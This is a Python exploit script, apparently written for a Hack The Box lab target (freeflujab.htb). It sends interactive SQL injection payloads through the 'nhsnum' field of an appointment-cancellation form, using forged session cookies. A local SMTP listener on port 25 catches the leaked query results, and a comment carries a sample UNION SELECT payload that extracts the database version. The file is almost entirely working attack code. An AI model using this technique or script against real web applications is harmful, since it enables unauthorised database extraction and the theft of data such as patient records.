#!/usr/bin/python3

from datetime import datetime
import asyncore
import threading
from smtpd import SMTPServer
import requests
import re
from pwn import *

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class EmlServer(SMTPServer):
	no = 0
	def process_message(self, peer, mailfrom, rcpttos, data, **kwargs):
		response = str(data,'utf-8')
		# print(response)
		result = re.findall(r"- Ref:(.*)",response)[0]
		log.success(result)
		print()


def run():
    EmlServer(('0.0.0.0', 25), None)
    try:
        asyncore.loop()
    except KeyboardInterrupt:
        pass


threads = []
t = threading.Thread(target=run)
threads.append(t)
t.start()

#nhsnum=NHS-921'UNION+SELECT+1,2,version(),4,5--+-&submit=Cancel+Appointment
# - Ref:
while True:
	payload = input("Enter the sql payload: ")
	payload1 = payload.strip("\n")
	print("\n"+f"Payload: {payload}")
	# print(payload1)
	data = {'nhsnum':f'NHS-921{payload1}','submit':'Cancel Appointment'}
	proxies = {'https':'http://127.0.0.1:8080'}
	cookies = {'Modus':'Q29uZmlndXJlPVRydWU%3d','Patient':'c7c0ef0dae0611b2aae064b52df30ca3','Registered':'YzdjMGVmMGRhZTA2MTFiMmFhZTA2NGI1MmRmMzBjYTM9VHJ1ZQ%3d%3d'}

	# if __name__ == '__main__':
	#     run()
	url = "https://freeflujab.htb/?cancel"
	r = requests.post(url,data=data,cookies=cookies,proxies=proxies,verify= False)
	response1=r.text 
# result = re.findall(r"- Ref:(.*)",response1)[0]
# print(result)

